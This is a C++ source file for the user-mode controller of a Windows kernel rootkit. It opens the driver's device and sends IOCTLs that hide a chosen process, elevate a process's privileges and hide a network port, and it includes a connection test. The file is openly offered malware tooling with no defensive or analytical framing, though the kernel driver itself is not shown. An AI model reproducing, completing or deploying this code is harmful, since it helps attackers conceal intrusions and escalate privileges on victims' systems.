#include "driver_handler.h"
#include "common.h"


Driver::DriverHandler::DriverHandler() {
	m_device_handle = CreateFile(
		Driver::DeviceName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		nullptr,
		OPEN_EXISTING,
		0,
		nullptr
	);
}


Driver::DriverHandler::~DriverHandler() {
	CloseHandle(m_device_handle);
}


bool Driver::DriverHandler::check_connection(char* message)
{
	char ReadBuffer[Driver::TestConnectionMaxLength] = { 0 };
	DWORD returned;
	bool status = DeviceIoControl(
		m_device_handle,
		static_cast<DWORD>(Driver::RookitIoctls::TestConnection),
		message, strlen(message),
		ReadBuffer,
		sizeof(ReadBuffer),
		&returned,
		nullptr
	);


	if (status)
		std::cout << "Message received from kerneland : " << ReadBuffer << "\n";
	else
		logError("Connection Test Failed.");

	return status;
}


bool Driver::DriverHandler::hide_process(char* message) {
	DWORD returned;

	bool status = DeviceIoControl(
		m_device_handle,
		static_cast<DWORD>(Driver::RookitIoctls::HideProcces),
		message,
		strlen(message),
		nullptr,
		0,
		&returned,
		nullptr
	);

	if (status)
		std::cout << "Process successfully hidden!\n";
	else
		logError("couldn't hide process");

	return status;
}

bool Driver::DriverHandler::elevate_process(char* message) {
	DWORD returned;

	bool status = DeviceIoControl(
		m_device_handle,
		static_cast<DWORD>(Driver::RookitIoctls::Elevate),
		message,
		strlen(message),
		nullptr,
		0,
		&returned,
		nullptr
	);

	if (status)
		std::cout << "Process successfully elevated!\n";
	else
		logError("couldn't elevate process");

	return status;
}

bool Driver::DriverHandler::hide_port(char* message) {
	DWORD returned;

	bool status = DeviceIoControl(
		m_device_handle,
		static_cast<DWORD>(Driver::RookitIoctls::HidePort),
		message,
		strlen(message),
		nullptr,
		0,
		&returned,
		nullptr
	);

	if (status)
		std::cout << "Port successfully Hidden!\n";
	else
		logError("couldn't hide port");

	return status;
}

HANDLE Driver::DriverHandler::device_handle(){
	return m_device_handle;
}
